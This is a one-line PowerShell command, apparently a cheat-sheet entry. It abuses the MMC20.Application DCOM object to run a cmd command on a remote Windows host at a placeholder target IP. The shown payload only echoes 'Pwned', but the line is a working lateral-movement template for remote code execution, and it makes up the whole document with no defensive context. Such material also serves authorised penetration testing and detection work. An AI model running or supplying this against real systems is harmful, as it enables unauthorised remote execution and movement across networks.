powershell.exe $a=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','<targetip>'));$a.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c echo Pwned','7')
